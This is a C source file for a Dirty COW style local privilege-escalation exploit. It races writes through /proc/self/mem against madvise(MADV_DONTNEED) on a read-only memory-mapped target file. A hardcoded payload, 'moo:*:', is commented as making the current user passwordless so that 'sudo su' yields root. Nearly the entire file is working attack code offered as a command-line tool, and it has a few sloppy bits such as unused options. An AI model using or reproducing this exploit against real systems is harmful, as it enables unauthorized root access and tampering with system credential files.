#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

#include <getopt.h>
#include <unistd.h>

#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>

typedef struct payload_info {
	char *string;
	off_t offset;
	void *loc_in_mem;
    int target_fd;
    int input_fd;
    bool append;
} PayloadInfo;

void print_error(int error) {
	fprintf(stderr, "Value of error: %d\n", error);
	fprintf(stderr, "Error message: %s\n", strerror(error));
	exit(EXIT_FAILURE);
}

// Write payload to mmap'd memory
void *writer_thread(void *arg) {
	PayloadInfo *info = arg;
	char *str = info->string;

	int fd = open("/proc/self/mem", O_RDWR);

	if (fd < 0) {
		print_error(errno);
	}

	for (int i = 0; i < 10000; i++) {
		if (info->append) {
			lseek(fd, (uintptr_t) info->loc_in_mem, SEEK_END);
		} else {
			lseek(fd, (uintptr_t) info->loc_in_mem + info->offset, SEEK_SET);
		}
		write(fd, str, strlen(str));
	}
}

// Advise kernel to drop mapping
void *madviser_thread(void *arg) {
	PayloadInfo *info = arg;

	for (int i = 0; i < 10000; i++) {
		madvise(info->loc_in_mem, 100, MADV_DONTNEED);
	}
}

int parse_opts(PayloadInfo *info, int argc, char * argv[]) {
	info->input_fd = STDIN_FILENO;
	info->offset = 0x0;
	info->append = 0;
	char interpret = 's';
	int c;

 	while (true) {
		int option_index = 0;
		static struct option long_options[] = {
			{"file",    required_argument, 0, 'f' },
			{"append",  no_argument,       0, 'a' },
			{"hex",     no_argument,       0, 'x' },
			{"string",  no_argument,       0, 's' },
			{"offset",  required_argument, 0, 'o' },
			{"help",    no_argument,       0, 'h' },
			{0,         0,                 0,  0  }
		};

		c = getopt_long(argc, argv, "ahsxf:o:", long_options, &option_index);

		if (c == -1)
			break;

		switch (c) {
			case 0:
				printf("option %s", long_options[option_index].name);

				if (optarg) {
					printf (" with arg %s", optarg);
				}

				printf ("\n");
				break;
			case 'f':  // file containing payload
				info->input_fd = open (optarg, O_RDONLY);

				if (info->input_fd < 0) {
					print_error(errno);
				}

				break;
			case 'o':  // offset position for payload (hex)
				sscanf(optarg, "%x", (unsigned int*) &info->offset);
				printf("offset: %d\n", (int) info->offset);
				break;
			case 's':  // interpret contents of payload as a string
				interpret = 's';
				break;
			case 'x':  // interpret contents of payload as hexadecimal
				interpret = 'x';
				break;
			case 'a':  // append to target file
				info->append = 1;
				break;
			case 'h':
				print_help();
				break;
			case ':': // no option specified
				printf("option needs a value\n");
				break;
			case '?': // unknown option
				printf("unkown option: %c\n", optopt);
				break;
			default:
				printf("?? getopt returned character code 0%o ??\n", c);
				abort();
		}
	}

	// Open target file
	info->target_fd = open(argv[argc-1], O_RDONLY);

	if (info->target_fd < 0) {
		print_error (errno);
	}

	return EXIT_SUCCESS;
}

void print_help() {
	printf("-f, --file   \t name of file contatining the payload\n"
			"-s, --string\t interpret payload in the file as a string\n"
			"-x, --hex   \t interpret payload in the file as hex values\n"
			"-o, --offset\t offset postition for lseek (hex)\n"
			"-a, --append\t append to target file\n"
			"-h, --help  \t help print out\n"
			"\nTarget file name must be the last argument\n");
}

int main(int argc, char * argv[]) {
	PayloadInfo info;
	parse_opts(&info, argc, argv);

	struct stat file_info;
	fstat(info.target_fd, &file_info);

	// Make current user passwordless, able to use "sudo su" to gain root access
	info.string = "moo:*:";
	info.loc_in_mem = mmap(NULL, file_info.st_size, PROT_READ, MAP_PRIVATE, info.target_fd, 0);

	pthread_t thread_1, thread_2;
	pthread_create(&thread_1, NULL, madviser_thread, &info);
	pthread_create(&thread_2, NULL, writer_thread, &info);

	pthread_join(thread_1, NULL);
	pthread_join(thread_2, NULL);

	close(info.input_fd);
	close(info.target_fd);

	return EXIT_SUCCESS;
}

